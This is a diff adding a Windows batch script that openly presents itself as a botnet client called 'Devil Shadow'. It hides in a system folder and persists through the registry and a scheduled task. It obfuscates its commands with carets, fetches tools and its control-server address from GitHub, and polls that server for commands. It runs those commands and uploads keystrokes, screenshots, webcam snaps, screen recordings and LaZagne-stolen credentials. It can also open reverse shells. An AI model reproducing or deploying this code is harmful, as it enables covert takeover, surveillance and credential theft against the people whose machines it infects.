@@ -1,0 +1,1424 @@
+@echo off
+ping localhost -n 3 >nul
+For /f "tokens=1" %%A in ('Tasklist /FI "WINDOWTITLE eq D3ViL ShaDow"') do (
+if "%%A"=="cmd.exe" goto process_found
+if "%%A"=="INFO:" goto no_process_found
+)
+if errorlevel 1 goto no_process_found
+:process_found
+echo [+] Process Found in Tasklist
+exit /b
+:no_process_found
+For /f "tokens=1" %%A in ('Tasklist /FI "WINDOWTITLE eq Administrator:  D3ViL ShaDow"') do (
+if "%%A"=="cmd.exe" goto process_found_admin
+if "%%A"=="INFO:" goto no_process_found_admin
+)
+if errorlevel 1 goto no_process_found
+:process_found_admin
+echo [+] Process Found in Tasklist
+exit /b
+:no_process_found_admin
+echo [-] No Process Found in Tasklist
+:main_setup
+title D3ViL ShaDow
+@echo.
+@echo (Devil Shadow) C^&C botnet
+rem *********************************
+rem ***hide win console via psh
+rem MODE CON: COLS=14 LINES=1
+rem p^o^w^e^r^s^h^e^l^l -win hidden exit
+rem **********************************
+rem ***********Auto_copy*************
+set filename=%~n0%~x0
+set filepath=%0
+set botnetdir=%systemdrive%\botnet
+set client_method=Curl_Client
+if exist "%botnetdir%\%filename%" (
+echo [+] %filename% Already Place
+goto autostartup
+) else (
+mkdir "%botnetdir%"
+copy /y %filepath% "%botnetdir%" >nul
+attrib +s +h +a "%botnetdir%"
+goto autostartup
+)
+rem ***** autostartup *****************
+:autostartup
+echo [+] Starting Backdoor Via Registry Current User
+if exist "%botnetdir%\botnet_start.vbs" goto setup
+echo S^e^t^ W^s^h^S^h^e^l^l^ = C^r^e^a^t^e^O^b^j^e^c^t^("WScript.Shell") >>"%botnetdir%\botnet_start.vbs"
+echo W^s^h^S^h^e^l^l^.R^u^n "cmd /c cd %botnetdir%&%botnetdir%\%filename%",0 >>"%botnetdir%\botnet_start.vbs"
+echo S^e^t^ W^s^h^S^h^e^l^l = Nothing >>"%botnetdir%\botnet_start.vbs"
+reg add hkcu\s^o^f^t^w^a^r^e^\m^i^c^r^o^s^o^f^t^\w^i^n^d^o^w^s^\currentversion\r^u^n /v botnet /t reg_sz /d "%botnetdir%\botnet_start.vbs" /f >nul
+goto setup
+rem ********Setup_Bot******************
+:setup
+rem ************************************
+for /f "tokens=*" %%A in ('hostname') do (
+set hostnme=%%A
+)
+set client_id=bot_id_%random%%random%
+if exist "%botnetdir%\client_id_file" (
+echo [+] Bot id alreay generate
+for /f "tokens=*" %%a in ('type "%botnetdir%\client_id_file"') do (
+set client_id=%%a
+)) else (
+echo [+] Generate bot id
+echo %client_id%>"%botnetdir%\client_id_file"
+)
+rem if not exist "%client_id% %hostnme%" (
+rem echo botid>> "%client_id% %hostnme%"
+)
+rem ***** check Connection *****
+echo [+] Checking Connection
+if not "%botnetdir%"=="%cd%" start %botnetdir%\botnet_start.vbs & exit
+%windir%\system32\ping.exe www.google.com -n 1 >nul
+if errorlevel 1 goto sleep
+rem **** Create Bot ID *************
+rem ************binary download **********************
+:checking_files
+if exist "curl.exe" (
+if exist "curl-ca-bundle.crt" (
+if exist "libcurl.dll" (
+if exist "unzip.exe" (
+if exist "webcam.exe" (
+if exist "screenshot.exe" (
+if exist "Programs\Autoit\AutoIt3.exe" (
+if exist "Programs\Autoit\keylog_autoit.exe" (
+if exist "execute.vbs" (
+if exist "K7firewall.exe" (
+goto check_av
+) else goto :download_bin_file
+) else goto :download_bin_file
+) else goto :download_bin_file
+) else goto :download_bin_file
+) else goto :download_bin_file
+) else goto :download_bin_file
+) else goto :download_bin_file
+) else goto :download_bin_file 
+) else goto :download_bin_file
+) else goto :download_bin_file
+
+
+
+:download_bin_file
+echo [*] Download Needed Binary Files
+set rar_url=https://raw.githubusercontent.com/DevilBot000/Tools/master/rar.exe
+set bin_url=https://raw.githubusercontent.com/DevilBot000/Tools/master/bin.rar
+if exist wget.js del wget.js >nul
+echo v^a^r W^in^Ht^tp^Req = n^ew A^ct^iv^eXO^bj^ec^t("WinHttp.WinHttpRequest.5.1");>>wget.js
+echo W^in^Htt^pReq.Op^e^n("GET", W^S^c^ri^pt.A^rg^ume^n^ts(0), /*async=*/false);>>wget.js
+echo Wi^nHt^tp^Req.S^en^d();>>wget.js
+echo WS^cr^ip^t.Ec^ho(Wi^nHt^tpR^eq.Re^spo^nse^Text);>>wget.js
+echo B^in^Str^ea^m = n^e^w Ac^tiv^eX^Obj^ect("ADODB.Stream");>>wget.js
+echo B^in^Str^ea^m.T^yp^e = 1;>>wget.js
+echo B^in^St^re^am.O^p^e^n();>>wget.js
+echo B^i^n^Str^e^am.W^r^i^t^e(WinHttpReq.ResponseBody);>>wget.js
+echo B^in^S^t^re^a^m.S^av^eT^oF^i^l^e(WS^cr^ip^t.A^rg^um^ent^s(1));>>wget.js
+ping localhost -n 2 >nul
+if not exist rar.exe echo [*] rar.exe Downloading & cscript /nologo wget.js %rar_url% rar.exe >nul
+if not exist rar.exe goto sleep
+echo [*] bin.rar Downloading
+cscript /nologo wget.js %bin_url% bin.rar >nul
+if not exist bin.rar goto sleep
+rar e -y bin.rar >nul
+if not exist Programs mkdir Programs
+if not exist "Programs\Autoit" mkdir "Programs\Autoit"
+rar e -y autoit.rar "Programs\Autoit" >nul
+del bin.rar >nul
+del autoit.rar >nul
+goto checking_files
+rem ************Sleeping **********************
+:sleep
+echo [+] Sleeping
+%windir%\system32\ping.exe localhost -n 60 >nul
+goto setup
+rem ******Get Command From Server *********************
+
+:check_av
+set foundav=K^7^A^n^t^i^V^i^r^u^s
+set av=
+wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe >"%temp%\av"
+for /f "tokens=1" %%A in ('type "%temp%\av" ^| find /i "%foundav%"') do (
+set av=%%A
+)
+if "%av%"=="%foundav%" start k7firewall.exe
+
+:loop
+set hosturl=
+set github_url=https://raw.githubusercontent.com/DevilBot000/Ngrok_host/master/host
+for /f "tokens=1" %%A in ('curl --silent "%github_url%"') do (
+set hosturl=%%A
+)
+for /f "tokens=1" %%a in ('curl --silent "http://myexternalip.com/raw"') do (
+set public_ip=%%a
+)
+if "%public_ip%"=="curl:" set public_ip=No_IP
+del %client_id%* >nul
+echo client >"%client_id% %hostnme% %public_ip% %client_method%"
+ping localhost -n 5 >nul
+set command1=
+set command2=
+set command3=
+set command4=
+echo [*] Uploading %client_id% to %hosturl%
+curl -H "Content-Type:multipart/form-data" -F "file=@%client_id% %hostnme% %public_ip% %client_method%" -X POST %hosturl%/devil_shadow/clients/index.php >nul
+if errorlevel 1 echo [-] Can't Upload %client_id% & ping localhost -n 5 >nul & goto loop
+echo [+] %client_id% Uploaded Successfully 
+echo [*] Reading Command %hosturl%
+curl -o nul -sfI %hosturl%/devil_shadow/command/command.txt
+if errorlevel 1 echo [-] No Command & goto loop
+for /F "tokens=1,2,3,*" %%A in ('curl.exe --silent %hosturl%/devil_shadow/command/command.txt') do (
+set command1=%%A
+set command2=%%B
+set command3=%%C
+set command4=%%D
+)
+if "%client_id%"=="%command1%" (
+ping localhost -n 1 >nul
+curl --silent %hosturl%/devil_shadow/command/command_del.php
+goto command_center
+) else (
+goto loop
+)
+rem *****check Reading Command *********************
+:command_center
+if "%command2%"=="cmd" goto cmd_command
+if "%command2%"=="ps" goto process_list
+if "%command2%"=="get_drive" goto get_drive_list
+if "%command2%"=="shellcode" goto check_shellcode_method
+if "%command2%"=="load" goto load_modules
+if "%command2%"=="get_startup" goto get_startup_list
+if "%command2%"=="run" goto run_file
+if "%command2%"=="get_av" goto get_antivirus_info
+if "%command2%"=="get_install" goto get_install_software
+if "%command2%"=="ls" goto get_ls
+if "%command2%"=="screenshot" goto screenshot_command
+if "%command2%"=="webcamshot" goto webcam_command
+if "%command2%"=="keylog_start" goto keylog_command
+if "%command2%"=="keylog_dump" goto keylog_command
+if "%command2%"=="keylog_stop" goto keylog_command
+if "%command2%"=="download" goto download_check_command
+if "%command2%"=="wget" goto wget_download
+if "%command2%"=="shell" goto shell_command
+if "%command2%"=="meterpreter" goto meterpreter_command
+if "%command2%"=="winvnc" goto winvnc_command
+if "%command2%"=="winvnc_install" goto winvnc_install
+if "%command2%"=="ngrok" goto ngroks_command
+if "%command2%"=="update" goto update_check
+if "%command2%"=="get_priv" goto gett_priv
+if "%command2%"=="sysinfo" goto get_systeminfo
+if "%command2%"=="upload" goto upload_command
+if "%command2%"=="install" goto install_language
+if "%command2%"=="reset" goto main_setup
+if "%command2%"=="get_uac_vul" goto found_uac_vul
+if "%command2%"=="uacbypass" goto found_uac_vul
+if "%command2%"=="kill" goto self_kill
+if "%command2%"=="get_reg" goto autostartup_reg_query
+if "%command2%"=="add_reg" goto add_autostartup_reg
+if "%command2%"=="runasadmin" goto start_runasadmin
+if "%command2%"=="get_pid" goto get_pid
+if "%command2%"=="get_task" goto get_task_scheduler
+if "%command2%"=="add_task" goto add_task_scheduler
+if "%command2%"=="start_task" goto start_task_scheduler
+if "%command2%"=="lazagne" goto lazagne_command
+if "%command2%"=="shell" goto shell_command
+if "%command2%"=="screenrecord" goto start_record_desktop
+if "%command2%"=="screenspy_start" goto screenspy-start
+if "%command2%"=="screenspy_stop" goto screenspy-stop
+
+
+echo [-] This command is not in the client plseas update client > output
+goto upload_output
+goto loop
+rem *********Execute Command ***********************
+
+
+:install_language
+if "%command3%"=="ruby" goto Install_ruby
+if "%command3%"=="python" goto Install_python
+goto loop
+
+:Install_ruby
+echo [*] Downloading Ruby Zip
+set ruby_url=https://raw.githubusercontent.com/DevilBot000/Tools/master/Ruby.zip
+if not exist Programs mkdir Programs
+echo [*] Checking is Ruby Already Installed 
+if exist "Programs\Ruby\bin\ruby.exe" (
+echo [+] Ruby Already Installed > output
+goto upload_output
+)
+if exist Ruby.zip del Ruby.zip >nul
+if not exist "Programs\Ruby\bin\ruby.exe" echo [*] Ruby.Zip Downloading & curl "%ruby_url%" --output ruby.zip >nul
+if exist Ruby.zip (
+echo [*] Ruby.zip Downloaded
+) else (
+echo [-] Ruby.zip Downloading Failed > output
+goto upload_output
+)
+if exist unzip.exe (
+unzip.exe -o -x Ruby.zip -d "Programs" >nul
+) else (
+echo [-] unzip.exe Not Found > output
+goto upload_output
+)
+if exist "Programs\Ruby\bin\ruby.exe" (
+del Ruby.zip >nul
+echo [+] Ruby Installed Successfully > output
+goto upload_output
+) else (
+echo [-] Ruby Not Install > output
+goto upload_output
+)
+
+:Install_python
+if defined command4 goto install_python_modules
+echo [*] Downloading Python27 Zip
+set python_url=https://raw.githubusercontent.com/DevilBot000/Tools/master/Python27.zip
+if not exist Programs mkdir Programs
+echo [*] Checking is Python Already Installed 
+if exist "Programs\Python27\python.exe" (
+echo [+] Python Already Installed > output
+goto upload_output
+)
+if exist python27.zip del python27.zip >nul
+if not exist "Programs\Python27\python.exe" echo [*] Python27.zip Downloading & curl "%python_url%" --output python27.zip >nul
+if exist python27.zip (
+echo [*] python27.zip Downloaded
+) else (
+echo [-] python27.zip Downloading Failed > output
+goto upload_output
+)
+if exist unzip.exe (
+unzip.exe -o -x python27.zip -d "Programs" >nul
+) else (
+echo [-] unzip.exe Not Found > output
+goto upload_output
+)
+if exist "Programs\Python27\python.exe" (
+del python27.zip >nul
+echo [+] Python27 Installed Successfully > output
+goto upload_output
+) else (
+echo [-] Python27 Not Install > output
+goto upload_output
+)
+
+
+
+
+:install_python_modules
+echo [*] Checking is Python Installed 
+if exist "Programs\Python27\python.exe" (
+echo [+] python Installed
+) else (
+echo [-] Python Not Installed > output & goto upload_output
+)
+if exist "Program\Python27\Scripts\pip.exe" (
+echo [+] pip.exe Found
+) else (
+echo [-] Pip.exe Not Found Update Python > output & goto upload_output
+)
+for /f "tokens=1,2" %%A in ('echo %command4%') do set moduel=%%B
+if exist py_moduls.vbs del py_moduls.vbs >nul
+echo S^e^t^ W^s^h^S^h^e^l^l^ = C^r^e^a^t^e^O^b^j^e^c^t^("WScript.Shell") >>"py_moduls.vbs"
+echo W^s^h^S^h^e^l^l^.R^u^n "cmd /c pymodules.bat",0 >>"py_moduls.vbs"
+echo S^e^t^ W^s^h^S^h^e^l^l = Nothing >>"py_moduls.vbs"
+if exist pymodules.bat del pymodules.bat >nul
+echo echo off >>pymodules.bat
+echo %botnetdir%\Program\Python27\python.exe %botnetdir%\Program\Python27\Scripts\pip.exe install %moduel% >>pymodules.bat
+echo del pymodules.bat >>pymodules.bat
+echo del py_moduls.vbs >>pymodules.bat
+ping localhost -n 1 >nul
+start py_moduls.vbs
+echo [+] Python %moduel% Install In Background > output
+goto upload_output
+
+:get_task_scheduler
+For /F "tokens=1" %%A in ('SchTasks /Query /TN "Admin_bot"') do (
+if "%%A"=="Admin_bot" echo [+] Admin Task Scheduler Found > output & goto upload_output
+)
+echo [-] Admin Task Scheduler Not Found > output
+goto upload_output
+
+:add_task_scheduler
+net session >nul 2>&1
+if %errorLevel% == 0 (
+SchTasks /Create /SC DAILY /TN "Admin_bot" /TR "cmd /c %systemdrive%\botnet\botnet_start.vbs" /ST 00:00 /RL HIGHEST /F >nul
+echo [+] Task Scheduler Create Successfully > output
+goto upload_output
+) else (
+echo [-] You Don't Have Admin Privileges > output
+goto upload_output
+)
+
+:start_task_scheduler
+For /F "tokens=1" %%A in ('SchTasks /Query /TN "Admin_bot"') do (
+if "%%A"=="Admin_bot" goto s_task
+)
+echo [-] Admin Task Scheduler Not Found > output
+goto upload_output
+:s_task
+if exist run.cmd del run.cmd >nul
+echo echo off >>run.cmd
+echo ping localhost -n 30 >>run.cmd
+echo schtasks /run /TN "Admin_bot">>run.cmd
+echo [+] Task Scheduler Start Successfully > output
+set final_command=exit
+start execute.vbs
+goto upload_output2
+
+:get_pid
+setlocal disableDelayedExpansion
+:getLock
+set "lock=%temp%\%~nx0.%time::=.%.lock"
+set "uid=%lock:\=:b%"
+set "uid=%uid:,=:c%"
+set "uid=%uid:'=:q%"
+set "uid=%uid:_=:u%"
+setlocal enableDelayedExpansion
+set "uid=!uid:%%=:p!"
+endlocal & set "uid=%uid%"
+2>nul ( 9>"%lock%" (
+  for /f "skip=1" %%A in (
+    'wmic process where "name='cmd.exe' and CommandLine like '%%<%uid%>%%'" get ParentProcessID'
+  ) do for %%B in (%%A) do set "PID=%%B"
+  (call )
+))||goto :getLock
+del "%lock%" 2>nul
+endlocal & if "%~1" equ "" (echo [+] Current Pid %PID% > output) else set "%~1=%PID%
+goto upload_output
+
+
+:autostartup_reg_query
+echo [+] Autostartup Reg Query
+if exist output del output >nul
+reg query h^k^c^u\s^o^f^t^w^a^r^e^\m^i^c^r^o^s^o^f^t^\w^i^n^d^o^w^s\c^u^r^r^e^n^t^v^e^r^s^i^o^n\r^u^n /v botnet >> output
+reg query h^k^l^m\s^o^f^t^w^a^r^e^\m^i^c^r^o^s^o^f^t^\w^i^n^d^o^w^s\c^u^r^r^e^n^t^v^e^r^s^i^o^n\r^u^n /v botnet >> output
+goto upload_output
+
+:add_autostartup_reg
+echo [+] Autostartup Reg Add
+if "%command3%"=="hkcu" (
+reg add h^k^c^u\s^o^f^t^w^a^r^e^\m^i^c^r^o^s^o^f^t^\w^i^n^d^o^w^s\c^u^r^r^e^n^t^v^e^r^s^i^o^n\r^u^n /v botnet /t reg_sz /d "%systemdrive%\botnet\botnet_start.vbs" /f >nul
+goto check_reg
+)
+net session >nul 2>&1
+if %errorLevel% == 0 (
+goto reg_method
+) else (
+echo [-] You Don't Have Admin Privileges > output
+goto upload_output
+)
+
+:reg_method
+if "%command3%"=="hklm" (
+if exist reg.txt del reg.txt >nul
+echo reg add h^k^l^m\s^o^f^t^w^a^r^e^\m^i^c^r^o^s^o^f^t^\w^i^n^d^o^w^s\c^u^r^r^e^n^t^v^e^r^s^i^o^n\r^u^n /v botnet /t reg_sz /d "%systemdrive%\botnet\botnet_start.vbs" /f >reg.txt
+more reg.txt | cmd
+reg delete h^k^c^u\s^o^f^t^w^a^r^e^\m^i^c^r^o^s^o^f^t^\w^i^n^d^o^w^s\c^u^r^r^e^n^t^v^e^r^s^i^o^n\r^u^n /v botnet /f >nul
+if exist reg.txt del reg.txt >nul
+goto check_reg
+)
+
+:check_reg
+for /f "tokens=1" %%A in ('reg query %command3%\s^o^f^t^w^a^r^e^\m^i^c^r^o^s^o^f^t^\w^i^n^d^o^w^s\c^u^r^r^e^n^t^v^e^r^s^i^o^n\r^u^n /v botnet ^| find /i "botnet"') do (
+if "%%A"=="botnet" echo [+] %command3% Autostartup Registry Add Successfully > output & goto upload_output
+)
+reg add h^k^c^u\s^o^f^t^w^a^r^e^\m^i^c^r^o^s^o^f^t^\w^i^n^d^o^w^s\c^u^r^r^e^n^t^v^e^r^s^i^o^n\r^u^n /v botnet /t reg_sz /d "%botnetdir%\botnet_start.vbs" /f >nul
+echo [-] Autostartup Reg Failed > output
+goto upload_output
+
+:get_systeminfo
+echo [*] Getting Systeminfo
+if exist output del output
+systeminfo | find /i "OS" >> output
+systeminfo | find /i "base" >> output
+if exist output (
+goto upload_output
+) else (
+echo [-] Can't Found Systeminfo > output
+goto upload_output
+)
+
+:gett_priv
+net session >nul 2>&1
+if %errorLevel% == 0 (
+echo [+] You Have Admin Privileges > output
+goto upload_output
+) else (
+echo [-] You Don't Have Admin Privileges > output
+goto upload_output
+)
+
+
+:start_runasadmin
+net session >nul 2>&1
+if %errorLevel% == 0 (
+echo [+] You Have Already Admin Privileges > output
+goto upload_output
+)
+set txtfile=
+set txtfile=test_%random%.txt
+echo [+] Creating UAC vbs Script
+if exist "runasadminvbs.vbs" del "runasadminvbs.vbs" >nul
+if exist "uac.bat" del "uac.bat" >nul
+set runasadmincmd=call %systemdrive%\botnet\uac.bat
+echo echo off >>"uac.bat"
+echo echo test ^>%systemdrive%\%txtfile% >>"uac.bat"
+echo ping localhost -n 30 ^>nul >>"uac.bat"
+echo Taskkill /FI "WINDOWTITLE eq D3ViL ShaDow" >>"uac.bat"
+echo start %systemdrive%\botnet\botnet_start.vbs >>"uac.bat"
+)
+echo s^e^t o^b^j^S^h^e^l^l = C^r^e^a^t^e^O^b^j^e^c^t^("Shell.Application")>>runasadminvbs.vbs
+echo o^b^j^S^h^e^l^l^.S^h^e^l^l^E^x^e^c^u^t^e "cmd", "/c %runasadmincmd%", "", "runas", 0 >>runasadminvbs.vbs
+ping localhost -n 1 >nul
+if exist "runasadminvbs.vbs" (
+echo [+] Starting runasadmin Script
+start /max runasadminvbs.vbs
+ping localhost -n 15 >nul
+goto check_runasadmin_command
+) else (
+echo [-] Run As Admin Script Creation Failed > output
+goto upload_output
+)
+
+
+
+
+
+:check_runasadmin_command
+ping localhost -n 3 >nul
+echo [*] Checking Run As Admin Command
+if exist "%systemdrive%\%txtfile%" (
+echo [+] Command Successfully Execute Wait For 30 Sec. > output
+set final_command=exit
+goto upload_output2
+) else (
+echo [-] Maybe Victim Select No Option > output
+goto upload_output
+)
+
+:lazagne_command
+if "%command3%"=="output" goto get_laz_output
+echo [*] Checking Python is Installed
+if exist output del output >nul
+if not exist "%systemdrive%\botnet\Programs\python27\python.exe" echo [-] Python is Not Install> output & goto upload_output
+if not exist "%systemdrive%\botnet\Programs\python27\laz.py" echo [-] %systemdrive%\botnet\Programs\python27\laz.py not found> output & goto upload_output
+
+For /f "tokens=1" %%A in ('Tasklist /FI "WINDOWTITLE eq lazagne"') do (
+if "%%A"=="cmd.exe" goto laz_process_found
+if "%%A"=="INFO:" goto laz_no_process_found
+)
+if errorlevel 1 goto laz_no_process_found
+:laz_process_found
+echo [+] lazagne Already Running > output& goto upload_output
+:laz_no_process_found
+For /f "tokens=1" %%A in ('Tasklist /FI "WINDOWTITLE eq Administrator:  lazagne"') do (
+if "%%A"=="cmd.exe" goto laz_process_found_admin
+if "%%A"=="INFO:" goto laz_no_process_found_admin
+)
+if errorlevel 1 goto laz_no_process_found_admin
+:laz_process_found_admin
+echo [+] lazagne Already Running > output& goto upload_output
+:laz_no_process_found_admin
+if exist lazagne_output del lazagne_output >nul
+echo echo off >>run.cmd
+echo title lazagne>>run.cmd
+echo %systemdrive%\botnet\Programs\python27\python.exe %systemdrive%\botnet\Programs\python27\laz.py %command3%^>lazagne_output >>run.cmd
+echo del run.cmd >>run.cmd
+start execute.vbs
+echo [+] lazagne Start In Background > output& goto upload_output
+
+
+:get_laz_output
+For /f "tokens=1" %%A in ('Tasklist /FI "WINDOWTITLE eq lazagne"') do (
+if "%%A"=="cmd.exe" goto laz2_process_found
+if "%%A"=="INFO:" goto laz2_no_process_found
+)
+if errorlevel 1 goto laz2_no_process_found
+:laz2_process_found
+echo [+] lazagne in Processing > output& goto upload_output
+:laz2_no_process_found
+For /f "tokens=1" %%A in ('Tasklist /FI "WINDOWTITLE eq Administrator:  lazagne"') do (
+if "%%A"=="cmd.exe" goto laz2_process_found_admin
+if "%%A"=="INFO:" goto laz2_no_process_found_admin
+)
+if errorlevel 1 goto laz2_no_process_found_admin
+:laz2_process_found_admin
+echo [+] lazagne in Processing > output& goto upload_output
+:laz2_no_process_found_admin
+if exist lazagne_output (
+copy /y lazagne_output output
+del lazagne_output
+goto upload_output
+)
+echo [-] No output Found > output& goto upload_output
+
+
+:self_kill
+exit
+
+:get_ls
+set getdirfile=
+if defined command4 (
+set getdirfile=%command3% %command4%
+goto execute_ls
+) else (
+set getdirfile=%command3%
+goto execute_ls
+)
+:execute_ls
+echo [*] Geting Dir and Files info
+dir "%getdirfile%" > output
+if exist output (
+goto upload_output
+) else (
+echo [-] Can't Execute ls Command > output
+goto upload_output
+)
+:download_check_command
+set uploadfile=
+if defined command4 (
+set uploadfile=%command3% %command4%
+goto download_command
+) else (
+set uploadfile=%command3%
+goto download_command
+)
+
+:cmd_command
+echo [*] Execute %command2%
+if exist output del output
+%command3% %command4%> output
+if exist output set /A count=0 & goto upload_output
+echo [-] %command3% can't execute
+goto loop
+
+:upload_output
+if "%count%"=="3" goto sleep
+echo [*] Sending output Command to %hosturl%
+curl %hosturl%/devil_shadow/output/output_del.php >nul
+curl -H "Content-Type:multipart/form-data" -F "file=@output" -X POST %hosturl%/devil_shadow/output/index.php >nul
+if errorlevel 1 echo [-] uploading failed & echo [*] Again try %count% time & set /A count+=1& goto upload_output
+echo [+] Uploaded Successfully
+del output >nul
+goto loop 
+
+:upload_output2
+if "%count%"=="3" goto sleep
+echo [*] Sending output Command to %hosturl%
+curl %hosturl%/devil_shadow/output/output_del.php >nul
+curl -H "Content-Type:multipart/form-data" -F "file=@output" -X POST %hosturl%/devil_shadow/output/index.php >nul
+if errorlevel 1 echo [-] uploading failed & echo [*] Again try %count% time & set /A count+=1& goto upload_output2
+echo [+] Uploaded Successfully
+del output >nul
+%final_command%
+
+
+:process_list
+echo [+] Get Process List
+if exist output del output
+wmic process list brief > output
+if exist output set /A count=0& goto upload_output
+echo [-] Can't Execute Command
+goto loop
+:get_startup_list
+echo [+] Get startup Entry
+if exist output del output
+wmic startup list full > output
+if exist output set /A count=0& goto upload_output
+echo [-] Can't Execute Command
+goto loop
+:get_drive_list
+echo [+] Get drives List
+if exist output del output
+wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber > output
+if exist output set /A count=0& goto upload_output
+echo [-] Can't Execute Command
+goto loop
+:run_file
+set pid=
+echo [+] Run File 
+for /f "tokens=3" %%A in ('wmic process call create "%command3%" ^| find /i "ProcessId"') do (
+set pid=%%A
+)
+if defined pid (
+echo [+] %command3% Pid=%pid% Started Successfully > output
+goto upload_output
+) else (
+echo [-] %command3% Not Starting > output
+goto upload_output
+)
+:get_antivirus_info
+echo [+] Get AntiVirus Details
+if exist output del output
+wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe > output
+if exist output set /A count=0& goto upload_output
+echo [-] Can't Execute Command
+goto loop
+:get_install_software
+echo [+] Get Installed Software List
+if exist output del output
+wmic product get name > output
+if exist output set /A count=0& goto upload_output
+echo [-] Can't Execute Command
+goto loop
+:screenshot_command
+echo [*] Getting Screenshot
+if exist screenshot.exe (
+screenshot.exe
+) else (
+echo [-] screenshot.exe not found > output
+goto upload_output
+)
+if exist screenshot.png (
+set /A count=0
+set send_filename=screenshot.png
+curl %hosturl%/devil_shadow/upload/png_del.php >nul
+goto send_file
+) else (
+goto loop
+)
+:webcam_command
+echo [*] Getting webcamsnap
+if exist webcam.exe (
+webcam.exe /filename webcamsnap.png
+)
+if exist webcamsnap.png (
+set /A count=0
+set send_filename=webcamsnap.png
+curl %hosturl%/devil_shadow/upload/png_del.php >nul
+goto send_file
+) else (
+set /A count=0
+set send_filename=webcamsnap.png
+curl https://raw.githubusercontent.com/DevilBot000/Tools/master/nowebcam.png --output webcamsnap.png --silent
+curl %hosturl%/devil_shadow/upload/png_del.php >nul
+goto send_file
+)
+:keylog_command
+if "%command2%"=="keylog_start" goto k_start
+if "%command2%"=="keylog_dump" goto k_dump
+if "%command2%"=="keylog_stop" goto k_stop
+:k_start
+echo [*] checking autoit klogger is Installed
+if not exist "Programs\Autoit\keylog_autoit.exe" (
+echo [-] Programs\Autoit\keylog_autoit.exe Not Found > output
+goto upload_output
+)
+echo [*] Starting Keylogger
+set process=
+for /F "tokens=1" %%A in ('tasklist ^| find /i "keylog_autoit.exe"') do (
+set process=%%A
+)
+if "%process%"=="keylog_autoit.exe" set /A count=0& echo [+] Keylogger Already Started > output & goto upload_output
+if exist Programs\Autoit\keylog_autoit.exe (
+start Programs\Autoit\keylog_autoit.exe Programs\Autoit\keylog.txt
+) else (
+set /A count=0
+echo [-] Programs\Autoit\keylog_autoit.exe Not Found > output
+goto upload_output
+)
+ping localhost -n 2 >nul
+if exist logs.txt (
+set /A count=0
+echo [+] Keylogger Started Successfully > output
+goto upload_output
+) else (
+set /A count=0
+echo [-] Keylogger not Start > output
+goto upload_output
+)
+:k_dump
+echo [*] Dump Keylogger
+set process=
+for /F "tokens=1" %%A in ('tasklist ^| find /i "keylog_autoit.exe') do (
+set process=%%A
+)
+if "%process%"=="keylog_autoit.exe" (
+taskkill /im keylog_autoit.exe /f >nul
+) else (
+set /A count=0
+echo [-] keylogger didn't start > output
+goto upload_output
+)
+if exist logs.txt (
+set /A count=0
+if exist output del output
+ren logs.txt output
+start Programs\Autoit\keylog_autoit.exe Programs\Autoit\keylog.txt
+goto upload_output
+) else (
+set /A count=0
+echo [-] Can't Dump Keylogger > output
+goto upload_output
+)
+:k_stop
+echo [*] Keylogger Stop
+set /A count=0
+set process=
+for /F "tokens=1" %%A in ('tasklist ^| find /i "keylog_autoit.exe"') do (
+set process=%%A
+)
+if "%process%"=="keylog_autoit.exe" (
+taskkill /im keylog_autoit.exe /f >nul
+if exist logs.txt del logs.txt
+echo [+] Keylogger Stop Successfully > output
+goto upload_output
+) else (
+echo [*] Keylogger Already Stop > output
+goto upload_output
+)
+
+:start_record_desktop
+echo [*] checking autoit is Installed
+if not exist "Programs\Autoit\AutoIt3.exe" (
+echo [-] Programs\Autoit\AutoIt3.exe Not Found > output
+goto upload_output
+)
+if exist Programs\Autoit\AutoIt3.exe (
+start /wait Programs\Autoit\AutoIt3.exe Programs\Autoit\video_recorder.au3 %command3%
+) else (
+set /A count=0
+echo [-] Programs\Autoit\AutoIt3.exe Not Found > output
+goto upload_output
+)
+ping localhost -n 2 >nul
+if exist Record.avi (
+set /A count=0
+echo [+] Recording Complete 
+goto send_record
+) else (
+set /A count=0
+echo [-] Recording not Start > output
+goto upload_output
+)
+
+:send_record
+echo [+] Create Archive File
+rar /y a file.rar Record.avi  >nul
+if exist file.rar (
+del Record.avi >nul
+) else (
+echo [-] Can't Create Archive File > output
+goto upload_output
+)
+echo [+] Sending Archive File to Server %hosturl%
+set send_filename=file.rar
+set go_lable=:upload_output
+goto send_file2
+
+
+
+:screenspy-start
+if exist screenspy.cmd del screenspy.cmd
+if exist screenspy.vbs del screenspy.vbs
+echo [+] Creating screenspy files
+echo echo off >>screenspy.cmd
+echo :loop >>screenspy.cmd
+echo screenshot.exe >>screenspy.cmd
+echo curl -H "Content-Type:multipart/form-data" -F "file=@screenshot.png" -X POST %hosturl%/devil_shadow/upload/index.php >>screenspy.cmd
+echo ping localhost -n 3 >>screenspy.cmd
+echo goto loop >>screenspy.cmd
+
+echo Set WshShell = CreateObject("WScript.Shell") >>screenspy.vbs
+echo WshShell.Run "%systemdrive%\botnet\screenspy.cmd",0  >>screenspy.vbs
+echo Set WshShell = Nothing  >>screenspy.vbs
+ping localhost -n 3 >nul
+start screenspy.vbs
+echo [+] Screenspy Start Successfully > output
+goto upload_output
+
+
+:screenspy-stop
+if exist screenspy.cmd (
+del screenspy.cmd
+del screenspy.vbs
+echo [+] Screenspy Stop > output
+goto upload_output
+) else (
+echo [-] Screenspy Already Stop > output
+goto upload_output
+)
+
+
+
+rem *********** reverse_cmd.exe **********************************
+:shell_command
+if "%command3%"=="pcmd" goto script_executer
+if "%command3%"=="rubycat" goto rubycat_shell
+
+
+
+:rubycat_shell
+echo [*] Downloading Rubycat
+if exist "run.cmd" del "run.cmd" >nul
+curl -o nul -sfI %hosturl%/devil_shadow/upload/rubycat.bat
+if errorlevel 1 echo [-] Rubycat Doesn't Exit On Server > output & goto upload_output
+curl %hosturl%/devil_shadow/upload/rubycat.bat --output "run.cmd"
+if exist "run.cmd" echo [+] Files Downloaded Successfully& goto check_ruby2
+echo [-] File Not Download > output
+goto upload_output
+
+:check_ruby2
+if exist "Programs\Ruby\bin\ruby.exe" (
+goto start_rubyshell
+) else (
+echo [-] Ruby is not Installed > output
+goto upload_output
+)
+
+:start_rubyshell
+if exist "run.cmd" (
+start execute.vbs
+echo [+] Rubycat Started Successfully > output
+goto upload_output
+) else (
+echo [-] Rubycat Not Found > output
+goto upload_output
+)
+
+
+
+
+
+
+:create_exec_vbs
+if exist exec.vbs del exec.vbs
